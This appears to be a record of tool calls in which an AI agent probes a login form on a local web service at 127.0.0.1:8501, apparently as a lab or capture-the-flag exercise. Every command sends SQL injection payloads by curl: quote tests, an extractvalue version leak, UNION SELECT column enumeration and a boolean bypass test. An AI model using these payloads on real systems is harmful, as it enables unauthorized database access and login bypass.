tool_calls.args:
{"command": "probe(){ echo "== username=[$1] =="; curl -s -m 8 -w '\n[HTTP %{http_code}]\n' --data-urlencode "username=$1" --data-urlencode 'password=x' http://127.0.0.1:8501/login | head -c 500; echo; }
probe "'"
probe "' AND extractvalue(1,concat(0x7e,version()))-- -"
probe "' UNION SELECT 'u1'-- -"
probe "' UNION SELECT 'u1','u2','u3'-- -"
probe "' UNION SELECT 'u1','u2','u3','u4'-- -""}

{"command": "probe(){ echo "== [$1] =="; curl -s -m 8 -w ' [HTTP %{http_code}]\n' --data-urlencode "username=$1" --data-urlencode 'password=x' http://127.0.0.1:8501/login | head -c 300; echo; }
probe "' UNION SELECT 'u1','u2'-- -"
probe "' UNION SELECT 'u1','u2','u3','u4','u5'-- -"
probe "' UNION SELECT 'u1','u2','u3','u4','u5','u6'-- -"
probe "' UNION ALL SELECT 'u1','u2'-- -"
probe "admin' AND '1'='1""}

{"command": "probe(){ echo "== [$1] =="; curl -s -m 8 -w ' [HTTP %{http_code}]\n' --data-urlencode "username=$1" --data-urlencode 'password=x' http://127.0.0.1:8501/login | head -c 300; echo; }
probe "' UNION SELECT 'u1','u2','u3','u4','u5','u6','u7'-- -"
